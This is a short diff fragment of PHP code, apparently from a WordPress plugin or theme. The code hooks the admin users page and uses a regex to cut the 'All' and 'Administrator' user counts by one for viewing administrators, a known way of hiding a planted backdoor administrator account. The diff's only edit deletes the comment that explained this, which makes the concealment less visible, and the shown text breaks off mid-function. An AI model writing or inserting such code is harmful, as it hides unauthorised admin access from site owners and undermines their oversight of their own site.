@@ -562,7 +562,6 @@ add_action('admin_head-users.php', function () {
 
     if ($user && in_array('administrator', (array) $user->roles)) {
         ob_start(function ($buffer) {
-            // Reduce "All" and "Administrator" counts by 1
             $buffer = preg_replace_callback(
                 '/(<a[^>]+users\.php(?:\?role=administrator)?[^>]*>\s*(All|Administrator)\s*<span class="count">\()(\d+)(\)<\/span>)/',
                 function ($matches) {
